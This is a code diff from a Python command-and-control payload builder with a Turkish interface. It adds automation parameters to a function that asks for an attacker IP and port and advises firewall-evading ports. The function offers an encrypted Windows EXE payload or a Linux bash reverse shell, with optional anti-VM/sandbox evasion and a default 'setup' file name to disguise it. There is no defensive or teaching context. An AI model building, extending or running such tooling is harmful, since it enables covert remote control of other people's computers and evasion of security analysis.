@@ -291,37 +291,47 @@ def decrypt_aes(enc_data, key):
         return unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8', errors='replace')
     except: return ""
 
-def c2_payload_builder():
+def c2_payload_builder(auto_lhost=None, auto_lport=None, auto_os=None, auto_antisb=None, auto_exename=None):
     clear_screen()
     print_banner()
     print(f"{C.YELLOW}[*] C2 Payload Builder (AES-256 Şifreli){C.RESET}\n")
     print_line()
     print(f"{C.DIM}  [!] Önerilen Portlar: 443 (HTTPS), 80 (HTTP), 53 (DNS) - Güvenlik duvarlarını aşmak için{C.RESET}\n")
 
-    lhost = input(f"{C.CYAN}  [?] LHOST (Saldırgan IP)   : {C.RESET}").strip()
-    lport = input(f"{C.CYAN}  [?] LPORT (Saldırgan Port) : {C.RESET}").strip()
+    try:
+        lhost = auto_lhost if auto_lhost else input(f"{C.CYAN}  [?] LHOST (Saldırgan IP)   : {C.RESET}").strip()
+        lport = auto_lport if auto_lport else input(f"{C.CYAN}  [?] LPORT (Saldırgan Port) : {C.RESET}").strip()
 
-    if not lhost or not lport:
-        print(f"{C.RED}  [-] Hata: Geçersiz IP veya Port.{C.RESET}")
-        input(f"\n{C.YELLOW}  Devam etmek için Enter'a basın...{C.RESET}")
+        if not lhost or not lport:
+            print(f"{C.RED}  [-] Hata: Geçersiz IP veya Port.{C.RESET}")
+            if not auto_lhost: input(f"\n{C.YELLOW}  Devam etmek için Enter'a basın...{C.RESET}")
+            return
+
+        print_line()
+        print(f"\n{C.BLUE}{C.BOLD}  --- Hedef Sistem ---{C.RESET}")
+        print(f"  {C.CYAN}1){C.RESET} Windows (Tek EXE Payload - AES256)")
+        print(f"  {C.CYAN}2){C.RESET} Linux (Bash Reverse Shell - Plain)")
+
+        os_choice = auto_os if auto_os else input(f"\n{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()
+
+        if os_choice == '1':
+            print_line()
+
+            if auto_antisb is not None:
+                anti_sb = auto_antisb
+            else:
+                anti_sb_input = input(f"\n{C.CYAN}  [?] Anti-VM/Sandbox koruması açılsın mı? {C.DIM}(Kendi PC'nizde test için 'H'){C.RESET} [E/h]: ").strip().lower()
+                anti_sb = False if anti_sb_input == 'h' else True
+
+            exe_name = auto_exename if auto_exename else (input(f"{C.CYAN}  [?] EXE dosya adı {C.DIM}[setup]{C.RESET}: ").strip() or "setup")
+    except (EOFError, KeyboardInterrupt):
+        print(f"\n{C.YELLOW}  [*] İşlem iptal edildi.{C.RESET}")
         return
 
-    print_line()
-    print(f"\n{C.BLUE}{C.BOLD}  --- Hedef Sistem ---{C.RESET}")
-    print(f"  {C.CYAN}1){C.RESET} Windows (Tek EXE Payload - AES256)")
-    print(f"  {C.CYAN}2){C.RESET} Linux (Bash Reverse Shell - Plain)")
-
-    os_choice = input(f"\n{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()
-
     if os_choice == '1':
-        print_line()
-
-        anti_sb_input = input(f"\n{C.CYAN}  [?] Anti-VM/Sandbox koruması açılsın mı? {C.DIM}(Kendi PC'nizde test için 'H'){C.RESET} [E/h]: ").strip().lower()
-        anti_sb = False if anti_sb_input == 'h' else True
-
-        exe_name = input(f"{C.CYAN}  [?] EXE dosya adı {C.DIM}[setup]{C.RESET}: ").strip() or "setup"
-
         print(f"\n{C.YELLOW}  [*] Payload oluşturuluyor...{C.RESET}")
+        import sys
+        sys.stdout.flush()
         
         aes_key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
         save_text("c2_aes_key.txt", aes_key)
